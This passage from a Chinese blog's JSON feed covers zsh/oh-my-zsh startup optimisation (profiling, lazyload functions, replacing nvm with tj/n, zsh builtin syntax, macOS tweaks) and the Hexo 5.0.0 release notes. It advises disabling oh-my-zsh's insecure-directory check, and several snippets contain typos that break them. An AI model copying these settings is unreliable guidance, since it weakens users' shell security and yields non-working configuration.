.zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 